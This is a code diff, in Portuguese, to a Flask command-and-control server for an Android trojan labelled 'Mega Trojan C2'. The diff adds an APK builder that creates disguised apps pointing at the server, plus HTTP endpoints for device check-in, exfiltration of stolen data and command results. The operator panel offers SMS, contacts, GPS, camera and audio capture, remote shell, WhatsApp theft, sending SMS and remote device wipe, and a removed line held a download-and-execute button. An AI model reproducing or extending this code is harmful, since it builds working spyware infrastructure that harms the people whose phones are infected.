@@ -6,6 +6,7 @@ Flask + WebSockets + SQLite
 """
 
 import os
+import sys
 import sqlite3
 import hashlib
 import secrets
@@ -22,10 +23,8 @@ app.config['SECRET_KEY'] = secrets.token_hex(32)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # A base de dados fica na pasta 80 (raiz do projeto)
-DB_PATH = os.path.join(
-    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
-    'c2.db'
-)
+BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+DB_PATH = os.path.join(BASE_DIR, 'c2.db')
 
 # ==================== BASE DE DADOS ====================
 
@@ -235,7 +234,7 @@ PANEL_TEMPLATE = '''
         <div id="builder-section" class="section">
             <h3>Gerador de APK</h3>
             <input type="text" id="apk_name" placeholder="Nome da aplicação (ex: CamScanner)">
-            <input type="text" id="c2_url" placeholder="URL do C2 (ex: ws://192.168.1.10:5000)">
+            <input type="text" id="c2_url" placeholder="URL do C2 (ex: http://teu-servidor)">
             <select id="icon_type">
                 <option value="camera">Câmara</option>
                 <option value="settings">Definições</option>
@@ -260,81 +259,107 @@ PANEL_TEMPLATE = '''
             if (name === 'logs') loadDeviceSelect();
         }
         async function loadDevices() {
-            const response = await fetch('/api/devices');
-            const devices = await response.json();
-            const grid = document.getElementById('device-grid');
-            grid.innerHTML = '';
-            devices.forEach(device => {
-                const card = document.createElement('div');
-                card.className = 'device-card ' + device.status;
-                card.innerHTML = `
-                    <h3>${device.model}</h3>
-                    <p>ID: ${device.device_id.substring(0, 16)}...</p>
-                    <p>Android: ${device.android_version}</p>
-                    <p>Última atividade: ${device.last_seen}</p>
-                    <p>Bateria: ${device.battery_level}%</p>
-                    <div class="device-actions">
-                        <button onclick="sendCommand('${device.device_id}', 'get_sms')">SMS</button>
-                        <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Contactos</button>
-                        <button onclick="sendCommand('${device.device_id}', 'get_location')">GPS</button>
-                        <button onclick="sendCommand('${device.device_id}', 'capture_photo')">Foto</button>
-                        <button onclick="sendCommand('${device.device_id}', 'record_audio', '{"duration": 30}')">Áudio 30s</button>
-                        <button onclick="sendCommand('${device.device_id}', 'download_file', '{"url": "https://exemplo.com/payload.apk"}')">Download+Exec</button>
-                        <button onclick="sendCommand('${device.device_id}', 'run_shell', '{"cmd": "id"}')">Shell</button>
-                        <button onclick="sendCommand('${device.device_id}', 'list_files', '{"path": "/sdcard/"}')">Ficheiros</button>
-                        <button onclick="sendCommand('${device.device_id}', 'steal_whatsapp')">WhatsApp</button>
-                        <button onclick="sendCommand('${device.device_id}', 'open_url', '{"url": "https://phishing.exemplo.com"}')">Abrir URL</button>
-                        <button onclick="sendCommand('${device.device_id}', 'send_sms', '{"to": "911", "message": "teste"}')">Enviar SMS</button>
-                        <button onclick="sendCommand('${device.device_id}', 'wipe_device')" style="color:#ff0000;">LIMPAR</button>
-                    </div>
-                `;
-                grid.appendChild(card);
-            });
+            try {
+                const response = await fetch('/api/devices');
+                const devices = await response.json();
+                const grid = document.getElementById('device-grid');
+                grid.innerHTML = '';
+                devices.forEach(device => {
+                    const card = document.createElement('div');
+                    card.className = 'device-card ' + device.status;
+                    card.innerHTML = `
+                        <h3>${device.model}</h3>
+                        <p>ID: ${device.device_id.substring(0, 16)}...</p>
+                        <p>Android: ${device.android_version}</p>
+                        <p>Última atividade: ${device.last_seen}</p>
+                        <p>Bateria: ${device.battery_level}%</p>
+                        <div class="device-actions">
+                            <button onclick="sendCommand('${device.device_id}', 'get_sms')">SMS</button>
+                            <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Contactos</button>
+                            <button onclick="sendCommand('${device.device_id}', 'get_location')">GPS</button>
+                            <button onclick="sendCommand('${device.device_id}', 'capture_photo')">Foto</button>
+                            <button onclick="sendCommand('${device.device_id}', 'record_audio', '{"duration": 30}')">Áudio 30s</button>
+                            <button onclick="sendCommand('${device.device_id}', 'run_shell', '{"cmd": "id"}')">Shell</button>
+                            <button onclick="sendCommand('${device.device_id}', 'list_files', '{"path": "/sdcard/"}')">Ficheiros</button>
+                            <button onclick="sendCommand('${device.device_id}', 'steal_whatsapp')">WhatsApp</button>
+                            <button onclick="sendCommand('${device.device_id}', 'open_url', '{"url": "https://exemplo.com"}')">Abrir URL</button>
+                            <button onclick="sendCommand('${device.device_id}', 'send_sms', '{"to": "911", "message": "teste"}')">Enviar SMS</button>
+                            <button onclick="sendCommand('${device.device_id}', 'wipe_device')" style="color:#ff0000;">LIMPAR</button>
+                        </div>
+                    `;
+                    grid.appendChild(card);
+                });
+            } catch (e) {
+                console.error('Erro ao carregar dispositivos:', e);
+            }
         }
         async function sendCommand(deviceId, command, args = '{}') {
-            const response = await fetch(`/api/devices/${deviceId}/send_command`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({command: command, arguments: args})
-            });
-            console.log('Comando enviado:', await response.json());
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/send_command`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({command: command, arguments: args})
+                });
+                const result = await response.json();
+                console.log('Comando enviado:', result);
+            } catch (e) {
+                console.error('Erro ao enviar comando:', e);
+            }
         }
         async function generateAPK() {
             const apkName = document.getElementById('apk_name').value;
             const c2Url = document.getElementById('c2_url').value;
             const iconType = document.getElementById('icon_type').value;
-            const response = await fetch('/api/generate_apk', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({apk_name: apkName, c2_url: c2Url, icon_type: iconType})
-            });
-            const result = await response.json();
-            document.getElementById('apk-result').innerHTML =
-                result.status === 'success'
-                    ? `<p style="color:#00ff00;">APK gerado: ${result.apk_path}</p>`
-                    : `<p style="color:#ff0000;">Erro: ${result.message}</p>`;
+            
+            if (!apkName || !c2Url) {
+                document.getElementById('apk-result').innerHTML = '<p style="color:#ff0000;">Preenche nome e URL do C2</p>';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/generate_apk', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({apk_name: apkName, c2_url: c2Url, icon_type: iconType})
+                });
+                const result = await response.json();
+                document.getElementById('apk-result').innerHTML =
+                    result.status === 'success'
+                        ? `<p style="color:#00ff00;">APK gerado: ${result.apk_path}</p>`
+                        : `<p style="color:#ff0000;">Erro: ${result.message}</p>`;
+            } catch (e) {
+                document.getElementById('apk-result').innerHTML = `<p style="color:#ff0000;">Erro: ${e.message}</p>`;
+            }
         }
         async function loadDeviceSelect() {
-            const response = await fetch('/api/devices');
-            const devices = await response.json();
-            const select = document.getElementById('log-device-select');
-            select.innerHTML = '';
-            devices.forEach(device => {
-                const option = document.createElement('option');
-                option.value = device.device_id;
-                option.textContent = device.model + ' (' + device.device_id.substring(0, 8) + '...)';
-                select.appendChild(option);
-            });
-            if (devices.length > 0) loadLogs();
+            try {
+                const response = await fetch('/api/devices');
+                const devices = await response.json();
+                const select = document.getElementById('log-device-select');
+                select.innerHTML = '';
+                devices.forEach(device => {
+                    const option = document.createElement('option');
+                    option.value = device.device_id;
+                    option.textContent = device.model + ' (' + device.device_id.substring(0, 8) + '...)';
+                    select.appendChild(option);
+                });
+                if (devices.length > 0) loadLogs();
+            } catch (e) {
+                console.error('Erro ao carregar seleção:', e);
+            }
         }
         async function loadLogs() {
             const deviceId = document.getElementById('log-device-select').value;
-            const response = await fetch(`/api/devices/${deviceId}/data`);
-            const data = await response.json();
-            const output = document.getElementById('log-output');
-            output.innerHTML = data.map(d =>
-                `<span style="color:#888;">[${d.created_at}]</span> ${d.data_type}: ${d.content}`
-            ).join('\n');
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/data`);
+                const data = await response.json();
+                const output = document.getElementById('log-output');
+                output.innerHTML = data.map(d =>
+                    `<span style="color:#888;">[${d.created_at}]</span> ${d.data_type}: ${d.content}`
+                ).join('\n');
+            } catch (e) {
+                console.error('Erro ao carregar logs:', e);
+            }
         }
         setInterval(() => {
             if (document.getElementById('devices-section').classList.contains('active')) loadDevices();
@@ -424,7 +449,135 @@ def api_send_command(device_id):
     }, room=device_id)
     return jsonify({'status': 'sent', 'command_id': command_id})
 
-# ==================== WEBSOCKET ====================
+# ==================== ROTA DE GERAÇÃO DE APK ====================
+@app.route('/api/generate_apk', methods=['POST'])
+@require_login
+def api_generate_apk():
+    try:
+        apk_name = request.json.get('apk_name', 'app')
+        c2_url = request.json.get('c2_url', '')
+        icon_type = request.json.get('icon_type', 'camera')
+        
+        # Adiciona o diretório do gerador ao path
+        gerador_dir = os.path.join(BASE_DIR, 'gerador')
+        sys.path.insert(0, gerador_dir)
+        
+        from gerador_apk import generate_apk
+        
+        apk_path = generate_apk(apk_name, c2_url, icon_type)
+        
+        if apk_path:
+            return jsonify({'status': 'success', 'apk_path': apk_path})
+        return jsonify({'status': 'error', 'message': 'Falha ao gerar APK'}), 500
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==================== ROTAS HTTP PARA O PAYLOAD ====================
+@app.route('/api/device_connect', methods=['POST'])
+def api_device_connect():
+    """Dispositivo regista-se ou reconecta via HTTP"""
+    try:
+        data = request.get_json(force=True)
+        device_id = data.get('device_id', '')
+        
+        if not device_id:
+            device_id = secrets.token_hex(16)
+        
+        model = data.get('model', 'Unknown')
+        android_version = data.get('android_version', 'Unknown')
+        manufacturer = data.get('manufacturer', 'Unknown')
+        phone_number = data.get('phone_number', 'Unknown')
+        ip_address = request.remote_addr
+        
+        conn = get_db()
+        
+        # Verifica se existe
+        existing = conn.execute(
+            "SELECT * FROM devices WHERE device_id = ?",
+            (device_id,)
+        ).fetchone()
+        
+        if existing:
+            conn.execute(
+                "UPDATE devices SET model=?, android_version=?, phone_number=?, ip_address=?, last_seen=CURRENT_TIMESTAMP, status='online' WHERE device_id=?",
+                (model, android_version, phone_number, ip_address, device_id)
+            )
+        else:
+            conn.execute('''
+                INSERT INTO devices (device_id, model, android_version, phone_number, ip_address, last_seen)
+                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
+            ''', (device_id, model, android_version, phone_number, ip_address))
+        
+        conn.commit()
+        
+        # Busca comandos pendentes
+        pending = conn.execute(
+            "SELECT * FROM commands WHERE device_id = ? AND status = 'pending'",
+            (device_id,)
+        ).fetchall()
+        conn.close()
+        
+        commands_list = []
+        for cmd in pending:
+            commands_list.append({
+                'id': cmd['id'],
+                'command': cmd['command'],
+                'arguments': cmd['arguments']
+            })
+        
+        return jsonify({
+            'status': 'success',
+            'device_id': device_id,
+            'commands': commands_list
+        })
+    
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/data_exfil', methods=['POST'])
+def api_data_exfil():
+    """Dispositivo envia dados recolhidos via HTTP"""
+    try:
+        data = request.get_json(force=True)
+        device_id = data.get('device_id', '')
+        data_type = data.get('data_type', '')
+        content = data.get('content', {})
+        
+        conn = get_db()
+        conn.execute(
+            "INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)",
+            (device_id, data_type, json.dumps(content))
+        )
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success'})
+    
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/command_result', methods=['POST'])
+def api_command_result():
+    """Dispositivo envia resultado de comando via HTTP"""
+    try:
+        data = request.get_json(force=True)
+        command_id = data.get('command_id')
+        result = data.get('result', {})
+        
+        conn = get_db()
+        conn.execute(
+            "UPDATE commands SET status='completed', result=? WHERE id=?",
+            (json.dumps(result), command_id)
+        )
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success'})
+    
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==================== WEBSOCKET (opcional) ====================
 @socketio.on('register')
 def handle_register(data):
     device_id = secrets.token_hex(16)
@@ -465,12 +618,12 @@ def handle_command_result(data):
     conn.close()
 
 @socketio.on('data_exfil')
-def handle_data_exfil(data):
+def handle_data_exfil_socket(data):
     conn = get_db()
     conn.execute("INSERT INTO collected_data (device_id, data_type, content) VALUES (?, ?, ?)", (data.get('device_id'), data.get('data_type'), json.dumps(data.get('content'))))
     conn.commit()
     conn.close()
 
 if __name__ == '__main__':
-    print("[+] Mega Trojan C2 iniciado em :5000")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    print("[+] Mega Trojan C2 iniciado na porta 80")
+    socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
